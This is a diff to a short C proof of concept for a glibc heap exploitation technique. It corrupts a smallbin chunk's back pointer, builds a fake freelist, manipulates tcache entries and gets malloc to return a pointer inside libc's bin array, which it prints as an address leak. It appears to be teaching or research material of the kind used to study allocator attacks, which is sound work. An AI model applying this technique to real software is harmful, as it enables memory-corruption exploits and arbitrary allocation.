@@ -2,8 +2,10 @@
 #include <assert.h>
 #include <stdio.h>
 
-int main(int argc, char * argv[]){ //the smallbin chunk we will overwrite the bk of
+int main(int argc, char * argv[]){
+	//the smallbin chunk we will overwrite the bk of
 	char *victim = malloc(0x510);
+	char *tcache = (char*)victim - 0x290;
 	//to avoid consolidation with top
 	char *guard = malloc(0x1000);
 	//put victim in unsorted bin
@@ -11,18 +13,26 @@ int main(int argc, char * argv[]){ //the smallbin chunk we will overwrite the bk
 	//allocate a chunk that will be cut from victim 
 	//the size of the remainder is 0x110(with metadata)
 	char *trim_victim = malloc(0x400);
+
 	//update victim to reflect the trim
 	victim =  trim_victim + 0x410;
 	//the victim including metadata
 	char **victim_chunk = (char **)victim-2;
 
+	//the chunk we will overwrite in its tcache entry
+	//its entry is the one immediately following the one
+	//corresponding to victim size
+	char *tcache_target = malloc(0x110);
+	tcache += 0x80 + (int)(0x110/0x10 - 1 )*8 ;
 	//sort victim into the small bin
 	//this progression bypasses filling the tcache 
 	//so 6 less allocations
-	void *sort = malloc(0x1000);
+	void *p2 = malloc(0x1000);
+	//putting tcache_target in tcache
+	free(tcache_target);
 
 	//keep the address of the smallbin for later sanity check
-	char *smallbin = victim_chunk[3];
+	char *smallbin = victim_chunk[2];
 
 	//create a fake freelist on the heap , we can use 
 	//the trim result for that
@@ -34,7 +44,6 @@ int main(int argc, char * argv[]){ //the smallbin chunk we will overwrite the bk
 	//to bypass the smallbin fd check
 	freelist[0][2] = (char *) victim_chunk;
 
-	char *tcache = (char*)victim_chunk - 0x6a0+0x108;
 
 	//the address of the smallbin will be written to 
 	//(freelist[6]->bk)->fd 
@@ -46,13 +55,12 @@ int main(int argc, char * argv[]){ //the smallbin chunk we will overwrite the bk
 
 	//this allocates victim and starts filling tcache with chunks from
 	//our freelist 
-	char *trigger = malloc(0x100);
-	char *alloc1 = malloc(0x100);
+	char *p3 = malloc(0x100);
 	//this allocates the smallbin address
-	char **alloc2 = malloc(0x100);
-	assert((long)alloc2 == (long)smallbin);
-	//get the address of the eith bin forward
-	printf("%p\n",alloc2[0]);
+	char **p5 = malloc(0x110);
+	assert((long)p5 == (long)smallbin);
+	//get the address of the bin before victims's 
+	printf("%p\n",p5[0]);
 
 	exit(0);
 }
